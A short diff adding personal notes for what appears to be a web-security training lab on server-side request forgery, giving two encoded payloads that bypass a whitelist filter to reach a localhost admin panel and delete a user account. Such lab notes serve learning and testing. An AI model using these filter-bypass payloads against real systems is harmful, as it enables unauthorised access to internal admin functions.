@@ -1,0 +1,12 @@
+Lab #04: SSRF with whitelist-based input filter
+
+info: - White list vuln in stock variable
+      - access the admin interface at http://localhost/admin
+
+End goal: Delete Carlos
+
+----------------
+Analysis:
+
+- Admin account payload : http://127.1%25%32%33@stock.weliketoshop.net/admin
+- Delete Carlos : http://127.1%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
